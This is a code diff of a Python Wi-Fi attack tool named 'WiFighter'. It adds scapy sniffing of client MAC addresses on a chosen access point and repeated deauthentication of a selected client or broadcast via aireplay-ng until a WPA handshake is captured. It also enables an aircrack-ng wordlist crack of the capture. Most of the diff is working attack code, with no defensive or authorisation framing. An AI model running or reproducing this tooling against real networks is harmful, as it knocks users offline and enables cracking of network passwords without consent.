@@ -6,7 +6,8 @@ import os, sys, subprocess, time, re, multiprocessing
 from multiprocessing import Process, Pipe
 from prettytable import PrettyTable 
 import psutil
-#from tqdm import tqdm 
+from scapy.all import *
+from scapy.all import Dot11
 
 
 # | GRAPHICS | #
@@ -35,10 +36,11 @@ LOGO = r"""
 # | GLOBAL VARIABLES | #
 
 interfering_services = ['NetworkManager', 'wpa_supplicant']
-attack_list = ['Handshake Crack', 'WPS Brute Force']
+attack_list = ['Handshake Crack', 'WPS Crack']
 deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
 
 wifi_networks = []
+sniffed_clients = []
 interface = None
 target_ap = None
 attack = None
@@ -104,7 +106,7 @@ def stop_services(verbose):
 
 def interface_mode(interface):
      mode = None
-     interface_info = os.popen(f'iw dev {interface} info').read()
+     interface_info = os.popen(f'iw dev {interface} info 2>&1').read()
      if 'type managed' in interface_info:
           mode = 'Managed'
      elif 'type monitor' in interface_info:
@@ -123,33 +125,33 @@ def monitor_switch(verbose, command, interface):
                stop_services(verbose)
 
                # Switch interface to Monitorw
-               os.system(f'ip link set {interface} down')
+               os.system(f'ip link set {interface} down 2>&1')
                if verbose:
-                    print(f"{CYAN}\nSetting {interface} to monitor mode...{RESET}")
-               os.system(f'iw dev {interface} set type monitor')
-               os.system(f'ip link set {interface} up')
+                    print(f"{CYAN}Setting {interface} to monitor mode...{RESET}")
+               os.system(f'iw dev {interface} set type monitor 2>&1')
+               os.system(f'ip link set {interface} up 2>&1')
           elif command == "start":
                if verbose:
-                print(f'{CYAN}Interface {interface} is already in Monitor Mode, skipping...\n{RESET}')
+                print(f'{CYAN}Interface {interface} is already in Monitor Mode, skipping...{RESET}')
           
           # Stop Monitor mode
           if command == "stop" and mode == "Monitor":
                # Switch interface to Managed
-               os.system(f'ip link set {interface} down')
+               os.system(f'ip link set {interface} down 2>&1')
                if verbose:
-                    print(f"{CYAN}\nSetting {interface} to managed mode...{RESET}")
-               os.system(f'iw dev {interface} set type managed')
-               os.system(f'ip link set {interface} up')
+                    print(f"{CYAN}Setting {interface} to managed mode...{RESET}")
+               os.system(f'iw dev {interface} set type managed 2>&1')
+               os.system(f'ip link set {interface} up 2>&1')
 
                # Start needed services
                start_services(verbose)
 
           elif command == "stop":
                if verbose:
-                print(f'{CYAN}Interface {interface} is already in Managed Mode, skipping...\n{RESET}')              
+                    print(f'{CYAN}Interface {interface} is already in Managed Mode, skipping...{RESET}')              
      else:
           if verbose:
-           print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"\n{RESET}')
+               print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"{RESET}')
 
 
 def list_interfaces():
@@ -316,14 +318,14 @@ def scan_ap(interface):
                while True:
                     if conn.poll():
                          break
-                    sys.stdout.write(f"\r{spinner[idx % len(spinner)]} Scanning for APs on {interface}")
+                    sys.stdout.write(f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} Scanning for APs on {interface}")
                     sys.stdout.flush()
                     idx += 1
                     time.sleep(0.1)
           except KeyboardInterrupt:
                conn.close()
      
-     parent_conn, child_conn = Pipe()
+     parent_conn, child_conn = multiprocessing.Pipe()
      scan_process = Process(target=scan_wifi, args=(interface, child_conn))
      animation_process = Process(target=loading_animation, args=(parent_conn,))
      
@@ -434,6 +436,58 @@ def list_ap(wifi_networks):
 
 # | Attacks | #
 
+def sniff_clients(interface, target_ap):
+     clients = set()
+     def packet_handler(pkt):
+        if pkt.haslayer(Dot11):
+            # Check if the packet is a data frame and from/to the target BSSID
+            if pkt.type == 2 and (pkt.addr2 == target_ap or pkt.addr1 == target_ap):
+                if pkt.addr2 == target_ap and pkt.addr1 not in clients and pkt.addr1.lower() != 'ff:ff:ff:ff:ff:ff':
+                    clients.add(pkt.addr1)
+                    #print(f"Client MAC Address: {pkt.addr1}")
+                elif pkt.addr1 == target_ap and pkt.addr2 not in clients and pkt.addr2.lower() != 'ff:ff:ff:ff:ff:ff':
+                    clients.add(pkt.addr2)
+                    #print(f"Client MAC Address: {pkt.addr2}")
+  
+     # Start sniffing on the specified interface
+     sniff(iface=interface, prn=packet_handler, timeout=10)  # Adjust timeout as needed
+
+     return list(clients)
+        
+
+def list_clients(sniffed_clients):
+     # Create AP table
+     table = PrettyTable()
+     table.field_names = ["ID", "Client MAC"]
+     for idx, client_mac in enumerate(sniffed_clients):
+          table.add_row([
+               f"{idx}",
+               client_mac or "N/A"
+          ])
+
+     print(f"{CYAN}| Client Scan |{RESET}")
+     print(f"{MAGENTA}{table}{RESET}")
+     print("\nPress [Ctrl + C] to stop")
+
+def choose_target_client():
+     global sniffed_clients
+     try:
+          while True:     
+               try:
+                    # Prompt the user to choose an interface by number
+                    choice = int(input(f"\n\nTarget client number: "))
+               except ValueError:
+                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
+                    continue
+               # Check if the choice is in range
+               if 0 <= choice < len(sniffed_clients):
+                    target_client = sniffed_clients[choice]
+                    return target_client # Return chosen interface
+               else:
+                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
+     except KeyboardInterrupt:
+          print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+
 def handshake_crack(target_ap, interface, deauth_mode):
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
@@ -441,7 +495,30 @@ def handshake_crack(target_ap, interface, deauth_mode):
      target = ssid if ssid else bssid # Set target by checking if SSID set
      channel = target_ap['Channel'] if target_ap['Channel'] else None
      deauth_mode = deauth_mode.lower()
-     client_mac = '02:26:02:03:25:e0'
+     target_client = None
+
+     monitor_switch(None, 'start', interface) # Make sure interface is in Monitor
+     stop_services(None) # Make sure interfering services are not running
+
+     # Set deauth client if needed
+     if deauth_mode == 'client deauth' and not target_client:
+          global sniffed_clients
+          try:
+               while True:
+                    # Get available AP's
+                    sniff_output = sniff_clients(interface, bssid) # Get output array from iw
+                    if sniff_output and isinstance(sniff_output, list):
+                         sniffed_clients = sniff_output 
+                    if sniffed_clients:
+                         logo()
+                         print(sniffed_clients)
+                         list_clients(sniffed_clients) # Show available clients's in table
+                    time.sleep(5)
+          except KeyboardInterrupt:
+               if sniffed_clients:
+                    target_client = choose_target_client() # Let user choose client as target
+               else:
+                    print(f"\n\n{RED}No clients found, exiting...{RESET}\n")
 
 
      global wifighter_path
@@ -487,15 +564,14 @@ def handshake_crack(target_ap, interface, deauth_mode):
                     pass
 
      # Run aireplay-ng
-     def run_aireplay(interface, bssid, client_mac, deauth_mode):
+     def run_aireplay(interface, bssid, target_client, deauth_mode):
           if interface and bssid and deauth_mode:
-               print(deauth_mode)
                if deauth_mode == "client deauth":
-                    if client_mac:
+                    if target_client:
                          try:
-                              command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
+                              command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', target_client, interface]
                               subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {client_mac}{RESET}")
+                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
                          except:
                               pass
                elif deauth_mode == "broadcast":
@@ -506,6 +582,10 @@ def handshake_crack(target_ap, interface, deauth_mode):
                     except:
                          pass
      
+
+     logo()
+     print(f'{CYAN}| Handshake Crack |{RESET}')
+     print()
      if ssid:
           print(f'Attacking on {ssid} ({bssid}) with {interface}...')
      else:
@@ -515,7 +595,7 @@ def handshake_crack(target_ap, interface, deauth_mode):
 
      # Define processes
      capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
-     deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_mode))
+     deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
 
      files_before = list_files(output_dir) # Get files before airodump-ng adds new
 
@@ -534,6 +614,8 @@ def handshake_crack(target_ap, interface, deauth_mode):
      # Wait and verify that handshake was captured successfuly
      captured = False
      print(f"{CYAN}[>]{RESET} Waiting for handshake... -> Capture file will be saved -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
+     if deauth_mode != 'silent':
+          start_time = time.time() # Start deauth timer
      while not captured:
           if os.path.exists(f"{output_dir}/{output_file}"):
                try:
@@ -545,11 +627,23 @@ def handshake_crack(target_ap, interface, deauth_mode):
                if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
                     print(f"{CYAN}[>]{RESET} Handshake/s captured!")
                     captured = True
+
+          # Periodically deauth                    
+          if deauth_mode != 'silent':
+               end_time = time.time() # End deauth timer
+               elapsed_time = end_time - start_time
+               elapsed_time = int(elapsed_time) # Get elapsed time before last deauth
+               if elapsed_time >= 17:
+                    deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
+                    deauth_client.start() # Start aireplay-ng process
+                    deauth_client.join() # Wait for the process to stop
+                    start_time = time.time() # Reset deauth timer
+
           time.sleep(1)
 
      kill_airodump_processes() # Kill all airodump-ng processes
      
-     #os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password
+     os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password
 
 
 #------------------------------------------------------------------------------------
@@ -559,7 +653,7 @@ def handshake_crack(target_ap, interface, deauth_mode):
 
 cmd_lenght = len(sys.argv)
 
-# SubCommands catch
+# Subcommands catch
 if cmd_lenght > 1:
      if cmd_lenght == 2:
           command = sys.argv[1].lower()
@@ -581,6 +675,7 @@ if cmd_lenght > 1:
 
           if command == "start" or command == "stop": # Interface mode switch function
                monitor_switch('verbose', command, interface)
+               print()
           elif command == "status": # Show interface mode status
                mode = interface_mode(interface)
                if mode:
@@ -623,23 +718,24 @@ else:
           logo()
           attack = choose_attack(target_ap)
      
+     # Run attacks
      if attack:
           logo()
           if attack == 'Handshake Crack':
                deauth_mode = choose_deauth_mode()
                if deauth_mode:
-                    logo()
-                    print(f'{CYAN}| Handshake Crack |{RESET}')
-                    print()
-                    monitor_switch(None, 'start', interface) # Make sure interface is in Monitor
-                    stop_services(None) # Make sure interfering services are not running
                     try:
                          handshake_crack(target_ap, interface, deauth_mode) # Start attack
                     except KeyboardInterrupt:
                          print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+
+          elif attack == 'WPS Crack':
+               print('WPS...')
      
+
+     # On tool end turn everything back on
      try:
-          monitor_switch(None, 'stop', interface)
+          monitor_switch('verbose', 'stop', interface)
      except KeyboardInterrupt:
           print(f"\n\n{BLUE}Exiting the tool...{RESET}")
      
